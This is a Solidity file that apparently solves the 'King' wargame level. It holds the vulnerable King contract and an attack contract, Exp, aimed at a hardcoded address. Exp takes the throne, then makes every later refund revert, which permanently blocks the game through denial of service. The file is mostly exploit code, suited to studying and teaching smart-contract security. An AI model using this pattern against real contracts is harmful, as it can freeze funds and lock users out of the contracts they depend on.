// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Exp {
    address target = 0x1E595A67205399dD63FFd4AA5b2AE252975FA78B;

    function exploit() payable public {
        (bool ok, ) = payable(target).call{value: msg.value}("");
        require(ok, "exploit() failed");
    }
    
    receive() external payable {
        (bool ok, ) = payable(target).call{value: 0}("");
        require(ok, "failed");
    }
}
